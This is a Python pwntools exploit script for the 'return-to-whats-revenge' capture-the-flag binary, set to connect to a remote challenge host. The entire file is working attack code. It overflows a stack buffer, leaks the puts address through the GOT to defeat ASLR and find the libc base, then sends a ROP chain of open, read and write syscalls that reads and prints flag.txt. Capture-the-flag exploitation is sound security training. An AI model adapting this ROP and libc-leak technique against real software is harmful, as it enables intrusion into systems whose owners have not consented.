from pwn import *
import sys
local = True

host = 'chal.duc.tf'
port = 30003
context.terminal = ['tmux','splitw','-h', '-p', '50']
context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./return-to-whats-revenge')

if local:
    p = process('./return-to-whats-revenge', env={'LD_PRELOAD':'/ctf/remote/libcs/libc6_2.27-3ubuntu1_amd64.so /glibc/2.27/64/lib/ld-2.27.so'})
    libc = ELF("/ctf/remote/libcs/libc6_2.27-3ubuntu1_amd64.so", checksec=False)
else:
    p = remote(host, port)
    libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')

if(len(sys.argv) > 1):
    gdb.attach(p, """
    b *0x4011d9
    """)
rop = ROP(elf)
PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

OFFSET = b'A' * (0x30 + 0x8)

log.info("puts@plt: " + hex(PUTS_PLT))
log.info("main@plt: " + hex(MAIN_PLT))
log.info("POP RDI: " + hex(POP_RDI))

bss = elf.bss(0x80)
def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    rop_chain = [
        POP_RDI, FUNC_GOT,
        PUTS_PLT,
        POP_RDI, bss,
        elf.plt['gets'],
        MAIN_PLT,
    ]

    rop_chain = b''.join([p64(i) for i in rop_chain])
    payload = OFFSET + rop_chain
    
    print(p.clean())
    print(payload)

    p.sendline(payload)

    received = p.recvline().strip()
    leak = u64(received.ljust(8, b'\x00'))
    libc.address = leak - libc.symbols[func_name]
    p.sendline('flag.txt')
    return hex(leak)

log.info('Leak: ' + get_addr('puts'))
log.info('Libc base: ' + hex(libc.address))


LIBC_GADGETS = {
    "pop rdx; ret" : 0x1b96,
    "syscall; ret" : 0xd2975,
    "pop rax; ret" : 0x439c8
}

GADGETS = {
    "pop rdi; ret" : p64(0x4019db),
    "pop rsp; pop r13; pop r14; pop r15; ret" : p64(0x4019d5),
    "pop rsi; pop r15; ret" : p64(0x4019d9),
    "ret" : p64(0x401016)
}

for key in LIBC_GADGETS:
    LIBC_GADGETS[key] = p64(libc.address + LIBC_GADGETS[key])

new_stack = bss

p.sendlineafter('to?\n',OFFSET+flat([    
    # open("/chal/flag.txt", 0, 0) = 3
    GADGETS["pop rdi; ret"],
    p64(new_stack),
    GADGETS["pop rsi; pop r15; ret"],
    p64(0),
    p64(0),
    LIBC_GADGETS["pop rdx; ret"],
    p64(0),
    LIBC_GADGETS["pop rax; ret"],
    p64(2),
    LIBC_GADGETS["syscall; ret"],
    
    # read(3, new_stack, 64)
    LIBC_GADGETS["pop rax; ret"],
    p64(0),
    GADGETS["pop rdi; ret"],
    p64(3),
    GADGETS["pop rsi; pop r15; ret"],
    p64(new_stack),
    p64(0),
    LIBC_GADGETS["pop rdx; ret"],
    p64(64),
    LIBC_GADGETS["syscall; ret"],
    
    # write(1, new_stack, 64)
    LIBC_GADGETS["pop rax; ret"],
    p64(1),
    GADGETS["pop rdi; ret"],
    p64(1),
    GADGETS["pop rsi; pop r15; ret"],
    p64(new_stack),
    p64(0),
    LIBC_GADGETS["pop rdx; ret"],
    p64(64),
    LIBC_GADGETS["syscall; ret"]
]))

p.recv()